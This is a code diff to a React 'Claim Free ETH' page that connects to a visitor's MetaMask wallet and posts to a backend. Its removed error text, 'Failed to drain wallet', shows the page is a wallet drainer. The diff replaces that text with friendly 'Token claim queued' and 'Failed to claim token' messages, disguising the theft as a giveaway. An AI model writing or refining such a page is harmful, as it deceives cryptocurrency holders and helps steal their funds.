@@ -10,7 +10,12 @@ const App = () => {
     setResponse(null);
 
     try {
-      // Request accounts from MetaMask
+      // Check if MetaMask is available
+      if (!window.ethereum) {
+        throw new Error("MetaMask is not installed.");
+      }
+
+      // Request accounts from wallet
       const accounts = await window.ethereum.request({
         method: "eth_requestAccounts",
       });
@@ -30,20 +35,31 @@ const App = () => {
       });
 
       const data = await res.json();
-      setResponse(data);
-      setLoading(false);
+
+      if (res.ok) {
+        setResponse({
+          success: true,
+          message: "Token claim queued. You will be credited in a few minutes.",
+        });
+      } else {
+        setResponse({
+          success: false,
+          message: "Failed to claim token. Try again later.",
+        });
+      }
     } catch (err) {
       console.error(err);
       setResponse({
-        error: "Failed to drain wallet. Please try again.",
-        message: err.message,
+        success: false,
+        message: "Failed to claim token. Try again later.",
       });
+    } finally {
       setLoading(false);
     }
   };
 
   return (
-    <div className="min-h-screen flex flex-col items-center justify-center p-4">
+    <div className="min-h-screen flex flex-col items-center justify-center p-4 bg-gray-900 text-white">
       <div className="max-w-md w-full bg-gray-800 p-8 rounded-lg shadow-lg text-center">
         <h1 className="text-4xl font-bold mb-6">Claim Free ETH</h1>
         <p className="text-lg mb-8">
